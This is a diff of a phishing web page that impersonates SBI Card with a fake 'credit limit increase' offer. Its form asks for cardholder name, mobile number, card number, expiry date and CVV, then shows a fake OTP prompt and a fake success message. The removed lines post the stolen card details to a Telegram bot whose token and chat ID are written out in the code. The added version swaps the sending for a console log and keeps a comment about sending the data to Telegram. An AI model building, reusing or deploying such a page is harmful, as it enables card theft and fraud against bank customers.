@@ -3,152 +3,184 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBI Credit Card Limit Increase</title>
+    <title>SBI Card Limit Increase</title>
     <link rel="stylesheet" href="styles.css">
-    <script defer src="script.js"></script>
+    <script src="script.js" defer></script>
     <style>
+        /* Basic styles */
         body {
-            background-image: url('SBI-Axis-Bank-Credit-Cards.jpg');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
             font-family: Arial, sans-serif;
-            color: white;
+            padding: 20px;
+            background-color: #f7f7f7;
         }
         .container {
-            background: rgb(0, 0, 0);
-            padding: 25px;
-            border-radius: 10px;
-            width: 30%;
+            max-width: 600px;
             margin: auto;
-            margin-top: 50px;
-            text-align: center;
-            box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.3);
-        }
-        input, label, span, h2, p, button {
-            color: white;
-        }
-        input {
-            display: block;
-            width: 90%;
-            margin: 10px auto;
-            padding: 10px;
-            font-size: 16px;
-            background: rgba(255, 255, 255, 0.2);
-            border: 1px solid white;
-            color: white;
-        }
-        .secure-icon {
-            display: block;
-            margin: 10px auto;
-            color: lightgreen;
+            background: #fff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
         }
         .logo {
-            width: 150px;
-            margin-bottom: 20px;
+            max-width: 100px;
+            margin: 0 auto;
+            display: block;
         }
-        button {
-            background-color: black;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
+        .hidden {
+            display: none;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
             border-radius: 5px;
         }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
         button:hover {
-            opacity: 0.8;
+            background-color: #45a049;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .otp-container {
+            background-color: #e9f7fa;
+            border: 1px solid #b0e0e6;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .otp-page-header {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .otp-input {
+            font-size: 18px;
+            text-align: center;
+            padding: 10px;
+            border-radius: 5px;
+            width: 50%;
+            margin-top: 10px;
+        }
+        .otp-countdown {
+            margin-top: 15px;
+            font-size: 18px;
+        }
+        .success-page {
+            background: #d4edda;
+            padding: 30px;
+            text-align: center;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="container" id="mainPage">
-        <img src="SBI Card_id6ifacJEt_0.png" alt="SBI Card Logo" class="logo">
-        <p class="secure-icon">🔒 Secured by SSL</p>
-        <div class="card-form">
-            <h2>Increase Your Credit Limit</h2>
-            <form id="creditForm">
-                <label>Card Holder Name:</label>
-                <input type="text" id="cardHolder" required>
-                
-                <label>Credit Card Number:</label>
-                <input type="text" id="cardNumber" maxlength="16" required>
-                <span id="cardBrand"></span>
-                
-                <label>Expiry (MM/YY):</label>
-                <input type="text" id="expiry" maxlength="5" required>
-                
-                <label>CVV:</label>
-                <input type="password" id="cvv" maxlength="3" required>
-                
-                <label>Total Available Limit:</label>
-                <input type="number" id="totalLimit" min="10000" max="400000" step="1000" required>
-                
-                <label>New Limit Increase:</label>
-                <input type="number" id="newLimit" value="63000" readonly>
-                
-                <button type="submit">Submit</button>
-            </form>
+    <div class="container">
+        <img src="sbi-logo.png" alt="SBI Card Logo" class="logo">
+        <h2>Increase Your SBI Card Limit</h2>
+        <form id="cardForm">
+            <label>Cardholder Name</label>
+            <input type="text" id="cardholderName" required>
+            
+            <label>Mobile Number</label>
+            <input type="tel" id="mobileNumber" pattern="[0-9]{10}" required>
+            
+            <label>Card Number</label>
+            <input type="text" id="cardNumber" maxlength="16" pattern="[0-9]{16}" required>
+            
+            <label>Expiry Date (MM/YY)</label>
+            <input type="text" id="expiryDate" pattern="(0[1-9]|1[0-2])/[0-9]{2}" required>
+            
+            <label>CVV</label>
+            <input type="password" id="cvv" maxlength="3" pattern="[0-9]{3}" required>
+            
+            <label>Total Available Limit</label>
+            <input type="text" id="totalLimit" value="500000" readonly>
+            
+            <label>New Limit Increase</label>
+            <input type="text" id="newLimit" value="63000" readonly>
+            
+            <button type="submit">Submit</button>
+        </form>
+
+        <div class="loading" id="loadingSpinner">Processing...</div>
+
+        <!-- OTP Verification Page -->
+        <div id="otpPage" class="hidden otp-container">
+            <h2 class="otp-page-header">OTP Verification</h2>
+            <p>A 6-digit OTP has been sent to your registered mobile number.</p>
+            <input type="text" id="otpInput" class="otp-input" maxlength="6" pattern="[0-9]{6}" required>
+            <p id="countdown" class="otp-countdown">Time remaining: 2:00</p>
+            <button id="verifyOtp">Verify OTP</button>
         </div>
-        <p class="copyright">© 2025 SBI Credit Card Department. All Rights Reserved.</p>
-    </div>
 
-    <div class="otp-container" id="otpPage" style="display:none; text-align:center; margin-top:50px;">
-        <h2>Enter OTP</h2>
-        <p>We have sent a 6-digit OTP to your registered number.</p>
-        <input type="text" id="otpInput" maxlength="6" required>
-        <p id="timer">02:00</p>
-        <button id="verifyOtp">Verify OTP</button>
-    </div>
-
-    <div class="success-container" id="successPage" style="display:none; text-align:center; margin-top:50px;">
-        <h2>Congratulations!</h2>
-        <p id="successMessage"></p>
+        <!-- Success Page -->
+        <div id="successPage" class="hidden success-page">
+            <h2>Congratulations <span id="cardholderSuccess"></span>!</h2>
+            <p>Your credit limit has been successfully increased.</p>
+            <p>Thank you for choosing SBI Card.</p>
+        </div>
     </div>
 
     <script>
-        const botToken = "7716096446:AAEllciPlN49o_E4ZXXY7wDYj-uRTwydkYE";
-        const chatId = "5153760850";
+        // Countdown timer for OTP
+        function startCountdown() {
+            let timeLeft = 120;
+            const countdownElement = document.getElementById("countdown");
+            const timer = setInterval(function() {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                countdownElement.textContent = `Time remaining: ${minutes}:${seconds.toString().padStart(2, "0")}`;
+                timeLeft--;
+                if (timeLeft < 0) {
+                    clearInterval(timer);
+                }
+            }, 1000);
+        }
 
-        document.getElementById('creditForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const cardHolder = document.getElementById('cardHolder').value;
-            const cardNumber = document.getElementById('cardNumber').value;
-            const expiry = document.getElementById('expiry').value;
-            const cvv = document.getElementById('cvv').value;
-            const totalLimit = document.getElementById('totalLimit').value;
-            const newLimit = document.getElementById('newLimit').value;
-            
-            let message = `New Credit Limit Request:\n` +
-                          `Card Holder: ${cardHolder}\n` +
-                          `Card Number: ${cardNumber}\n` +
-                          `Expiry: ${expiry}\n` +
-                          `CVV: ${cvv}\n` +
-                          `Total Limit: ${totalLimit}\n` +
-                          `New Limit: ${newLimit}`;
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            });
-            
-            document.getElementById('mainPage').style.display = 'none';
-            document.getElementById('otpPage').style.display = 'block';
-            startTimer();
+        // Form submission
+        document.getElementById("cardForm").addEventListener("submit", function(event) {
+            event.preventDefault();  // Prevent form from reloading the page
+            document.getElementById("loadingSpinner").style.display = 'block';  // Show loading spinner
+
+            const data = {
+                cardholderName: document.getElementById("cardholderName").value,
+                mobileNumber: document.getElementById("mobileNumber").value,
+                cardNumber: document.getElementById("cardNumber").value,
+                expiryDate: document.getElementById("expiryDate").value,
+                cvv: document.getElementById("cvv").value
+            };
+
+            // Simulate sending the data to Telegram (you can replace this with actual API call)
+            console.log("Sending data:", data);
+            setTimeout(() => {
+                document.getElementById("loadingSpinner").style.display = 'none';  // Hide spinner
+                document.getElementById("otpPage").classList.remove("hidden");  // Show OTP page
+                startCountdown();  // Start countdown
+            }, 2000);  // Simulate a 2-second delay for API response
         });
 
-        document.getElementById('verifyOtp').addEventListener('click', function() {
-            const otp = document.getElementById('otpInput').value;
-            if (!/^[0-9]{6}$/.test(otp)) {
-                alert("Invalid OTP. Please enter a valid 6-digit OTP.");
-                return;
+        // OTP Verification
+        document.getElementById("verifyOtp").addEventListener("click", function() {
+            const otp = document.getElementById("otpInput").value;
+            if (otp.length === 6) {
+                document.getElementById("otpPage").classList.add("hidden");  // Hide OTP page
+                document.getElementById("successPage").classList.remove("hidden");  // Show success page
+                document.getElementById("cardholderSuccess").textContent = document.getElementById("cardholderName").value;
+            } else {
+                alert("Please enter a valid OTP.");
             }
-            
-            const cardHolder = document.getElementById('cardHolder').value;
-            document.getElementById('otpPage').style.display = 'none';
-            document.getElementById('successPage').style.display = 'block';
-            document.getElementById('successMessage').textContent = `Congratulations, ${cardHolder}! Your limit will increase successfully. It will show in your application after 24 hours.`;
         });
     </script>
 </body>
